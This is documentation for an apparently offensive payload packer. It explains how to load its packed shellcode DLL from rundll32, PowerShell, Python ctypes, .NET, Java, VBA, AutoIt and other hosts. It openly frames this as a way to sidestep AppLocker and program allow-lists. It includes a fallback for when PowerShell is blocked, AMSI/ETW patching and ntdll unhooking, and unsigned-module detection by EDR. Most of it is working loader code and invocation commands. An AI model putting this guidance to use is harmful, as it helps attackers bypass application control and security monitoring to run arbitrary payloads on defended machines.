# Host programs — loading a packed DLL

A `build.output.kind: dll` artifact is a DLL: it is not run, it is **loaded by
some other program** (the *host*), in the host's own process. That is the point
of the mode — application whitelisting usually allows *programs* (SRP /
AppLocker / a GPO program rule), and a DLL is not a program, so the rule that
lets the host run is the rule that ends up running the chain. Design:
[DLL output](design/dll-output.md); measured numbers: [Measurements](measurements.md).

Runnable, copy-paste versions of the recipes below live in `examples/hosts/`
(`ctypes_host.py`, `pinvoke_host.ps1`, `dotnet_host/`, `rundll32_host.ps1`,
`perl_host.pl`, `ruby_host.rb`, `php_host.php`, `luajit_host.lua`,
`node_host.js`, `java_host/`). Build one of the two example DLLs first:

```sh
cargo run -- build examples/plans/dll-shellcode.yaml   # chain returns 42
cargo run -- build examples/plans/dll.yaml             # chain opens a dialog
```

## At a glance

| Host | Loads with | In-box (no extra package) | Blocking export | Reports the code | Status |
|---|---|---|---|---|---|
| CPython | `ctypes` | yes (stdlib) | yes | yes (`42`) | **measured** |
| PowerShell 5.1 | `Add-Type` (P/Invoke) | yes (in-box) | yes | yes (`42`) | **measured** |
| .NET (`dotnet`) | `NativeLibrary` + delegate | yes (runtime) | yes | yes (`42`) | **measured** |
| `rundll32.exe` | its own loader | yes (Windows) | yes | **no** (always exits 0) | **measured** |
| Perl (Windows) | `Win32::API` | Strawberry bundles it | yes | yes | documented |
| Java 22+ | `java.lang.foreign` (FFM) | yes (JDK) | yes | yes | documented |
| Java (any) | `System.load` → `JNI_OnLoad` | yes (JDK) | no (detached) | no | documented |
| Ruby | `Fiddle` | yes (stdlib) | yes | yes | documented |
| PHP | `FFI` extension | bundled, must be enabled | yes | yes | documented |
| LuaJIT | `ffi` | yes (LuaJIT only) | yes | yes | documented |
| Node.js | `koffi` | **no** (npm) | yes | yes | documented |
| Office (VBA) | `Declare PtrSafe Function` | yes (Office) | yes | yes | documented |
| AutoIt / AutoHotkey | `DllCall` | yes | yes | yes | documented |
| R / Julia | `dyn.load` / `ccall` | yes | yes | yes | documented |
| Tcl | `ffidl` | no | yes | yes | documented |
| cmd / batch | no FFI — can only *launch* a host (`rundll32`, below) | — | — | — | **measured** |
| WSH (JScript/VBScript), `mshta`, Lua 5.4 | — | — | — | — | **cannot** |

*Blocking export* = the host's own thread is held for the payload's lifetime
(what keeps `rundll32` alive); *detached* = the chain runs on a worker and the
host returns immediately. Nothing here needs the host to be the packed `.exe`.

## The calling shape (read this first)

The plain export is emitted in the shape `rundll32` calls with:

```c
int Run(void *hwnd, void *hinst, const char *cmdline, int show);
```

- **All four arguments are ignored.** The return value is the chain's code
  (`run()`'s `Ok(code)`), so a caller that sees `42` has proof the chain ran.
- **x64**: one calling convention, caller-pushed arguments. A zero-argument call
  is fine; declaring four is also fine (the extra slots are unused).
- **x86**: `extern "system"` is `__stdcall`. A `stdcall` callee pops four
  arguments, so a caller must push four — `rundll32` does natively, and
  `ctypes.CDLL` (cdecl) **does not**: on 32-bit Python use `ctypes.WinDLL`, and
  pass four zeros. The portable recipe is therefore *always* `WinDLL` + four
  zero arguments (on x64 both are no-ops).
- Languages that default to cdecl need the convention spelled out on x86:
  `__stdcall` in a Koffi prototype, `Win32::API` (default `__stdcall`), etc.

Pick the entry for the host:

| `build.output.entry` | Exports | For |
|---|---|---|
| `export:Run` | `DllMain`, `Run` | FFI hosts (Python, .NET, Perl, Ruby, PHP, LuaJIT, Node, VBA, …) |
| `jni_on_load` | `DllMain`, `JNI_OnLoad` | a JVM that only needs the load-and-go path |
| `auto` (default) | `DllMain`, `JNI_OnLoad`, `Run` | one artifact for every host — the export table is a deliberate tell |

## Measured hosts

Windows 11, x64, `x86_64-pc-windows-msvc`. The full matrix and the commands are
in [Measurements](measurements.md).

### CPython — `ctypes` (standard library)

No `pip`, no `numpy`, nothing to install: `ctypes` ships with CPython.

```python
import ctypes

lib = ctypes.CDLL(r"dist\dll-shellcode.dll")   # x64
# 32-bit Python: ctypes.WinDLL (stdcall) and pass the four arguments.
func = lib.Run
print(f"Run() -> {func(0, 0, 0, 0)}")          # -> 42
```

Python is the tidiest host for a *blocking* technique: the interpreter just
waits on the call, and every host thread stays alive for the payload.

### PowerShell 5.1 — `Add-Type` P/Invoke

In-box on every Windows: `Add-Type` compiles a tiny C# class (with the in-box
CodeDom compiler) and the CLR does the loading. The module then shows up in the
host's module list.

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Host {
    [DllImport(@"C:\path\to\loader.dll", EntryPoint = "Run")]
    public static extern int Run(IntPtr hwnd, IntPtr hinst, IntPtr cmd, int show);
}
"@
[Host]::Run([IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, 0)   # -> 42
```

Gotchas: `Add-Type` fails under **ConstrainedLanguage** mode (WDAC/AppLocker
Device Guard policies) — check that yourself before counting on this host.
PowerShell 7 (the .NET one) additionally has
`[System.Runtime.InteropServices.NativeLibrary]::Load/GetExport`, which needs no
compiler and takes a runtime path.

### .NET — `NativeLibrary` + a delegate

A .NET host does not need `[DllImport]`'s compile-time constant path:
`NativeLibrary.Load` takes a runtime path, and
`Marshal.GetDelegateForFunctionPointer` turns the export into a callable
delegate. `examples/hosts/dotnet_host/` is a complete console host
(`dotnet run --project examples/hosts/dotnet_host -- <dll> <export>`).

```csharp
IntPtr module = NativeLibrary.Load(Path.GetFullPath(dll));
IntPtr address = NativeLibrary.GetExport(module, "Run");
var run = Marshal.GetDelegateForFunctionPointer<PlainExport>(address);
int code = run(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0);   // -> 42

[UnmanagedFunctionPointer(CallingConvention.Winapi)]
internal delegate int PlainExport(IntPtr hwnd, IntPtr hinst, IntPtr cmdline, int show);
```

`JNI_OnLoad` is *not* called by this path (that is the JVM's own loader), which
is why `entry: export:<name>` is the right entry here.

### `rundll32.exe`

```
rundll32 loader.dll,Run
```

The odd one out: it is a Windows program (not the artifact), it calls the export
natively in the four-argument shape, it is signed by Microsoft, and the default
AppLocker rule set lets it run. Four traps, all measured, all of which cost time
when they bite:

- **Always exits 0.** It never relays the export's return value, so the evidence
  is the chain's own output or a side effect — never the exit code.
- **Do not quote the path.** `rundll32.exe <dll>,<entry>` calls the export;
  `rundll32.exe "<dll>",<entry>` and `rundll32.exe "<dll>,<entry>"` were both
  measured to fail *before* the call, with a relative and an absolute path. Keep
  the artifact on a path without spaces, or take its 8.3 short name
  (`for %%I in ("%path%") do set "short=%%~sI"`, as
  `examples/hosts/rundll32_host.cmd` does).
- **A failure is a modal dialog, not an error code.** A missing export or an
  unloadable path pops a `MessageBox` and the process just sits there: measured,
  a mis-quoted invocation left a `rundll32` process blocked (`MainWindowTitle`
  empty) with no output anywhere and exit code 0. In an automated run that looks
  like success — verify the chain's effect.
- **A console attach beats redirection.** Started from cmd, the stub's marker
  lands in cmd's console (`AttachConsole(ATTACH_PARENT_PROCESS)` succeeds), and
  `rundll32 ... > file` leaves the file **empty**, because the attach installs
  the console handles and wins over the inherited redirected ones. To capture the
  bytes from a parent that has no console, use the PowerShell script
  (`Start-Process -RedirectStandardError`) — it works because *that* parent has
  none either, so the attach has nothing to attach to. From cmd, cmd does not
  wait for a GUI-subsystem child at all, so keep the console alive briefly after
  the launch; and do not wrap the call in `start` — measured, `start /wait`
  changed the console context and the attach stopped working entirely.

### When PowerShell is not available

"PowerShell is disabled" usually means a policy blocked the *host*, and cmd
cannot replace it as a host — but it does not have to:

- **Batch cannot import a DLL.** cmd has no FFI: no `[DllImport]`-style binding,
  no `ctypes`. A `.cmd` can only *launch* something that can.
- **`rundll32 loader.dll,Run` from cmd does run the chain.** Measured 3/3 with a
  payload that writes a marker file, so the evidence does not depend on the
  console, and the shell is not a scripting host: no ConstrainedLanguage, no
  script-block logging. `examples/hosts/rundll32_host.cmd` is that launcher.
- **Other PowerShell-free hosts**: any allowed interpreter (Python, Perl, Java,
  Ruby, PHP, LuaJIT, Node), Office/VBA, AutoIt/AutoHotkey, or a compiled host.
  `regsvr32 /s loader.dll` also loads a DLL, but calls `DllRegisterServer` —
  which this artifact does not export: measured, the chain did not run and it
  still exited 0, so under `/s` its exit code is not evidence. It would need
  `entry: export:DllRegisterServer` (on x64, where the four-argument shape is
  harmless against a zero-argument caller).
- **`wscript`/`cscript` (JScript, VBScript) and `mshta` cannot** — no FFI. "If
  PowerShell is blocked, use VBScript" does not work.
- **What the block is matters more than the host.** A *scripting-host* block
  (ConstrainedLanguage, an AppLocker/WDAC rule against `powershell.exe`) leaves
  every host above untouched; **DLL rules** (AppLocker DLL rules, WDAC code
  integrity enforced) block the artifact itself at load, whoever loads it — there
  the signature is the variable, not the host; and a **program allow-list** is
  exactly what `kind: dll` sidesteps, as long as the host is one of the allowed
  programs (and the default rules put everything under `%WINDIR%` on that list,
  which is why `rundll32` survives).

## Documented hosts

The scripts are committed, but this repository's measurement host did not have
the runtime installed (the reason is noted per host), so treat these as
recipes to verify on the target.

### Perl — `Win32::API`

Strawberry Perl bundles `Win32::API`; it is also on CPAN. Use the **prototype**
form: with it, an `undef` argument becomes a C `NULL`, and the module's default
calling convention is `__stdcall`, which is what `extern "system"` is on x86.

```perl
use Win32::API;

my $fn = Win32::API::More->new(
    $dll,
    "int Run(void *hwnd, void *hinst, const char *cmdline, int show)"
) or die "Win32::API: " . Win32::GetLastError() . "\n";

my $code = $fn->Call(undef, undef, undef, 0);
print "Run() -> $code\n";
```

The `-list` (letter) form is the alternative, but its `P` type is for buffers
that need padding, so the prototype is the one to reach for. Note that the MSYS
Perl that ships with Git for Windows **cannot** do this: it is a Unix Perl and
has no `Win32::API`. `Win32::API` also covers the reverse case — calling a Win32
API from Perl — so a Perl host is the natural pick when the engagement is
already a Perl script.

### Java — the JVM

Two independent paths, and they behave differently:

**FFM (JDK 22+, `java.lang.foreign`)** — load and call, return value included.
`examples/hosts/java_host/FfmHost.java`:

```java
SymbolLookup lookup = SymbolLookup.libraryLookup(Path.of(dll), Arena.global());
MethodHandle run = Linker.nativeLinker().downcallHandle(
        lookup.find("Run").orElseThrow(),
        FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS,
                              ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT));
int code = (int) run.invokeExact(MemorySegment.NULL, MemorySegment.NULL,
                                 MemorySegment.NULL, 0);          // -> 42
```

On JDK 21, FFM is still a preview API and needs `--enable-preview`; before that,
the only zero-dependency option is a JNI wrapper (JNA is the usual shortcut, but
it is a dependency).

**`System.load` (any JDK)** — the JVM calls `JNI_OnLoad`, which starts the chain
on a worker thread and returns at once. Two consequences:

```java
System.load(new java.io.File(dll).getAbsolutePath());
Thread.sleep(10_000);   // the JVM owns the process: keep it alive
```

- the Java program must **stay alive** (a `Thread.sleep`, a latch, a
  `System.in.read()`): a `main` that returns right after `System.load` exits the
  JVM, and a native thread created by Rust is invisible to that decision;
- the entry's return code is not available — read a side effect instead.

`examples/hosts/java_host/JavaHost.java` is that host. `System.load` is
in-process, so the JVM's bitness has to match the DLL's (a 64-bit `java.exe`
will not load a 32-bit DLL, and vice versa: `UnsatisfiedLinkError`).

The parked `AttachCurrentThread` extension (design Phase E) is what would let the
JVM wait for the worker on its own.

### Ruby — `Fiddle` (standard library)

```ruby
require 'fiddle'

lib = Fiddle.dlopen(dll)
func = Fiddle::Function.new(
  lib['Run'],
  [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT],
  Fiddle::TYPE_INT
)
puts func.call(0, 0, 0, 0)   # -> 42
```

`Fiddle` is stdlib, so a Ruby host needs no gem. (`dl` is the older interface;
`Fiddle` is the maintained one.)

### PHP — the `FFI` extension

`FFI` ships with the official Windows builds but has to be enabled in `php.ini`
(`extension=ffi`), and it cannot be turned on at runtime: `ffi.enable` is
`INI_SYSTEM`. Its default value, `preload`, still allows the **CLI** SAPI, which
is the case that matters here.

```php
$ffi = FFI::cdef("int Run(void *hwnd, void *hinst, const char *cmdline, int show);", $dll);
echo $ffi->Run(null, null, null, 0);   // -> 42
```

A PHP web SAPI with the default `ffi.enable=preload` will refuse
(`FFI API is restricted to preloaded files`); the CLI will not.

### LuaJIT — `ffi` (built in)

```lua
local ffi = require("ffi")
ffi.cdef("int Run(void *hwnd, void *hinst, const char *cmdline, int show);")
local lib = ffi.load(dll)
print(lib.Run(nil, nil, nil, 0))   -- -> 42
```

`ffi` exists in **LuaJIT only**. Standard Lua 5.4 has no FFI; there it is
`alien` (a C module) or a LuaJIT build.

### Node.js — `koffi`

```js
const koffi = require('koffi');
const lib = koffi.load(dll);
const run = lib.func('int __stdcall Run(void *hwnd, void *hinst, const char *cmdline, int show)');
console.log(run(null, null, null, 0));   // -> 42
```

Unlike the others, Node has **no stdlib FFI**: `process.dlopen` loads a `.node`
native addon, not an arbitrary DLL, so a package is unavoidable (`koffi` is the
maintained one; `ffi-napi` is unmaintained). State the dependency cost before
planning on a Node host.

### Office (VBA) — `Declare PtrSafe Function`

In-process, in-box, and the classic macro-enabled document host:

```vb
Private Declare PtrSafe Function Run Lib "C:\path\loader.dll" Alias "Run" _
    (ByVal hwnd As LongPtr, ByVal hinst As LongPtr, ByVal cmdline As String, ByVal show As Long) As Long
```

`PtrSafe` is required in 64-bit Office; drop it (and use `Long`) only in a 32-bit
Office. The three pointer parameters receive `LongPtr` addresses; an `As String`
parameter receives a pointer to an ANSI buffer, and `vbNullString` passes NULL.

### AutoIt / AutoHotkey

```autoit
DllCall("loader.dll", "int", "Run", "ptr", 0, "ptr", 0, "str", "", "int", 0)
```

```autohotkey
DllCall(A_ScriptDir "\loader.dll\Run", "Ptr", 0, "Ptr", 0, "Ptr", 0, "Int", 0, "Int")
```

Both are in-box interpreters with FFI built in, and both are common on
workstations.

### R, Julia, Tcl

```r
dyn.load(dll)
# Then .C("Run", ...) / .Call(): R marshals the arguments by position and type.
```

```julia
ccall((:Run, dll), Cint, (Ptr{Cvoid}, Ptr{Cvoid}, Ptr{UInt8}, Cint),
      C_NULL, C_NULL, C_NULL, 0)
```

Julia's `ccall` names the export and the DLL together and maps the four ignored
arguments directly. R's `.C` passes pointers to its arguments and returns the
*argument list*, not the C return value — so read a side effect, or read the
value the export wrote. Tcl needs `ffidl`/`critcl`: its own `load` command is for
Tcl extension packages, not for arbitrary DLLs.

## Hosts that cannot do it

Worth knowing, because "just wrap it in a script" is a common plan:

- **cmd / batch** and **WSH (JScript/VBScript)** have no FFI at all.
- **Standard Lua 5.4** has no `ffi` (LuaJIT does).
- **Node.js** needs a package (above).
- **Python, PowerShell, .NET, Ruby, Java, PHP, Perl, VBA** can all do it in-box
  (PHP with one `php.ini` line).

## Caveats that apply to every host

- **Bitness must match** the host, and the payload matches too (it runs
  in-process). A wrong-architecture DLL fails at load: `ERROR_BAD_EXE_FORMAT`.
- **Process-scoped techniques patch the host.** `patch_etw`, `unhook_ntdll` and
  `patch_amsi` act on `java.exe`/`python.exe`/`powershell.exe`, and
  `reflective_loading` rewrites the host's PEB `CommandLine`. That is usually the
  point, but it is a state change in someone else's process — and `patch_amsi`
  can *load* `amsi.dll` into a host that had none.
- **The module is a mapped module of the host.** It shows up in the module list,
  in image-load telemetry, and an *unsigned module inside a signed host* is what
  an EDR reports first. `build.output.sign` is the mitigation with the most
  value here; a `lab` signature only helps where its CA is trusted.
- **The DLL cannot be deleted while it is loaded** (`self_deletion` is rejected
  for DLL builds for exactly this reason, and because it would resolve the
  *host's* image).
- **Console output is the host's.** The entry calls
  `AttachConsole(ATTACH_PARENT_PROCESS)`; if the host never had a console (a GUI
  host, a service, `rundll32`), attach cannot invent one and the output is
  dropped.
